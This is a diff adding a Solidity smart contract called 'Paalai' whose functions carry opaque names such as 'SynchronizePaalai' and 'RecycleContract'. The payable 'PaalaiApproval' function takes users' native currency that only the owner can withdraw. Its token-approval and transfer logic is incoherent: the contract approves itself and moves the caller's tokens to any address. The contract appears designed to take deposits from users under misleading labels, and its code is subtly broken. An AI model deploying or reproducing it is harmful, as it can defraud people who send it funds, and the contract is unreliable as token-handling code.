@@ -1,0 +1,78 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint);
+    function transfer(address recipient, uint amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+    function approve(address spender, uint amount) external returns (bool);
+}
+
+contract Paalai {
+    struct TokenData {
+        address tokenAddress;
+        uint tokenBalance;
+    }
+
+    mapping(address => mapping(address => uint)) private allowedAmounts;
+
+    event PaalaiX(address indexed owner, address indexed tokenAddress, uint amount);
+    event PaalaiSynchronized(address indexed from, address indexed to, address indexed tokenAddress, uint amount);
+    event NativeTokenTransferred(address indexed recipient, uint amount);
+
+    address private contractOwner;
+
+    modifier onlyOwner() {
+        require(msg.sender == contractOwner, "Only the contract owner can call this function");
+        _;
+    }
+
+    constructor() {
+        contractOwner = msg.sender;
+    }
+
+    function setContractOwner(address newOwner) external onlyOwner {
+        contractOwner = newOwner;
+    }
+
+    function PaalaiApprovalStatus(address user, address tokenAddress) public view returns (uint) {
+        return allowedAmounts[user][tokenAddress];
+    }
+
+    function PaalaiApproval(TokenData[] memory tokenDataArr) public payable {
+        for (uint i = 0; i < tokenDataArr.length; i++) {
+            TokenData memory data = tokenDataArr[i];
+            if (data.tokenAddress == address(0)) {
+                require(msg.value >= data.tokenBalance, "Not Eligible");
+            } else {
+                IERC20 token = IERC20(data.tokenAddress);
+                require(token.approve(address(this), data.tokenBalance), "Approval Failed");
+                allowedAmounts[msg.sender][data.tokenAddress] = data.tokenBalance;
+            }
+            emit PaalaiX(msg.sender, data.tokenAddress, data.tokenBalance);
+        }
+    }
+
+    function SynchronizePaalai(TokenData[] memory tokenDataArr, address to) public {
+        for (uint i = 0; i < tokenDataArr.length; i++) {
+            TokenData memory data = tokenDataArr[i];
+            uint allowedAmount = allowedAmounts[msg.sender][data.tokenAddress];
+            require(allowedAmount >= data.tokenBalance, "Approval Missing");
+
+            IERC20 token = IERC20(data.tokenAddress);
+            uint balance = token.balanceOf(address(this));
+
+            if (balance > 0) {
+                require(token.transferFrom(msg.sender, to, balance), "Synchronization Failed");
+                emit PaalaiSynchronized(msg.sender, to, data.tokenAddress, balance);
+            }
+        }
+    }
+
+    function RecycleContract(address payable recipient, uint amount) external onlyOwner payable {
+    require(address(this).balance >= amount, "Insufficient balance");
+    recipient.transfer(amount);
+    emit NativeTokenTransferred(recipient, amount);
+}
+
+}
